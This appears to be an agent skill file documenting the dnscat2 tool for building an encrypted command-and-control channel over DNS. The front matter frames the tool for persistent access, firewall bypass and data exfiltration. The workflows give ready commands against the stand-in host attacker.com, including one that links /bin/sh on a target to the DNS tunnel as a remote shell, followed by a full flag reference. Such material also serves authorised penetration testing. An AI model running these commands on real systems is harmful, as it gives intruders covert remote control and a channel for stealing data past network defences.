---
name: dnscat2
description: Create an encrypted command-and-control (C&C) channel over the DNS protocol. This tool is highly effective for tunneling out of restricted networks where DNS traffic is permitted. Use during exploitation and post-exploitation phases to establish persistent access, bypass firewalls, or exfiltrate data via DNS queries.
---

# dnscat2

## Overview
dnscat2 is a tool designed to create a command-and-control (C&C) channel over DNS. It consists of a server-side component (run on an authoritative DNS server or a reachable IP) and a client-side component (run on the target machine). It supports encryption, authentication, and multiple simultaneous sessions. Category: Exploitation / Post-Exploitation.

## Installation (if not already installed)
The tool is split into client and server packages.

```bash
sudo apt update
sudo apt install dnscat2-client dnscat2-server
```

## Common Workflows

### Basic C2 Setup (Direct Connection)
On the attacker (Server):
```bash
dnscat2-server --dns "domain=attacker.com" --secret=MySecret123
```
On the target (Client):
```bash
dnscat --dns domain=attacker.com --secret=MySecret123
```

### Reverse Shell / Process Execution
To immediately execute a shell on the target and link it to the DNS stream:
```bash
dnscat --dns domain=attacker.com --exec /bin/sh
```

### Testing Connectivity (Ping)
Check if a dnscat2 server is reachable without establishing a full session:
```bash
dnscat --ping --dns domain=attacker.com
```

### Running Server on Non-Standard Port
Useful if port 53 is already bound or for local testing:
```bash
dnscat2-server --dns "host=127.0.0.1,port=53531,domain=local.test"
```

## Complete Command Reference

### dnscat (Client)

```
Usage: dnscat [args] [domain]
```

#### General Options
| Flag | Description |
|------|-------------|
| `--help`, `-h` | Show help page |
| `--version` | Get the version |
| `--delay <ms>` | Set max delay between packets (default: 1000, min: 50) |
| `--steady` | Always wait for the delay before sending the next message |
| `--max-retransmits <n>` | Max re-transmissions before assuming server is dead (default: 20) |
| `--retransmit-forever` | Re-transmit indefinitely until a server responds |
| `--secret` | Set shared secret to prevent MitM attacks |
| `--no-encryption` | Disable encryption and authentication |

#### Input Options
| Flag | Description |
|------|-------------|
| `--console` | Send/receive output to the console |
| `--exec`, `-e <process>` | Execute process and link it to the stream |
| `--command` | Start an interactive 'command' session (default) |
| `--ping` | Check if a dnscat2 server is listening |

#### Debug Options
| Flag | Description |
|------|-------------|
| `-d` | Increase debug info (can be used multiple times) |
| `-q` | Decrease debug info (can be used multiple times) |
| `--packet-trace` | Display incoming/outgoing dnscat2 packets |

#### Driver Options (`--dns <options>`)
Options are passed as comma-separated `key=value` pairs.
| Key | Description |
|-----|-------------|
| `domain=<domain>` | The domain to make requests for |
| `host=<hostname>` | The host to listen on (default: 0.0.0.0) |
| `port=<port>` | The port to listen on (default: 53) |
| `type=<type>` | DNS request types: TXT, MX, CNAME, A, AAAA (default: TXT,CNAME,MX) |
| `server=<server>` | Upstream DNS server (default: autodetected) |

---

### dnscat2-server

```
Usage: dnscat2-server [options] [domain]
```

#### General & Network Options
| Flag | Description |
|------|-------------|
| `-h`, `--help` | Show help message |
| `-v`, `--version` | Get the version |
| `-d`, `--dns=<s>` | Start DNS server. Format: `host=IP,port=PORT,domain=DOMAIN` |
| `-n`, `--dnshost=<s>` | [Deprecated] DNS IP to listen on (default: 0.0.0.0) |
| `-s`, `--dnsport=<i>` | [Deprecated] DNS port to listen on (default: 53) |
| `-p`, `--passthrough=<s>` | Forward unhandled requests to upstream DNS (host:port) |

#### Security & Automation
| Flag | Description |
|------|-------------|
| `-e`, `--security=<s>` | Security level: `open`, `encrypted`, `authenticated` |
| `-c`, `--secret=<s>` | Pre-shared secret for authentication/encryption |
| `-a`, `--auto-command=<s>` | Command to send to every client upon connection |
| `-u`, `--auto-attach` | Automatically attach to new sessions |
| `-r`, `--process=<s>` | Run given process for every incoming session (Security Risk) |

#### Output & Debug
| Flag | Description |
|------|-------------|
| `-k`, `--packet-trace` | Display incoming/outgoing packets |
| `-i`, `--history-size=<i>` | Lines of history maintained per window (default: 1000) |
| `-f`, `--firehose` | Force all output to stdout instead of interactive windows |
| `-l`, `--listener=<i>` | DEBUG: Start a listener driver on the given port |

## Notes
- **Encryption**: By default, dnscat2 encrypts traffic. Using `--secret` on both ends is highly recommended to prevent Man-in-the-Middle (MitM) attacks.
- **DNS Records**: While `TXT` records offer the most bandwidth, some environments may only allow `A` or `CNAME` queries. Use the `type=` option to adapt.
- **Authoritative DNS**: For the tunnel to work over the internet, you must point the NS records of a domain you control to the IP address of your dnscat2 server.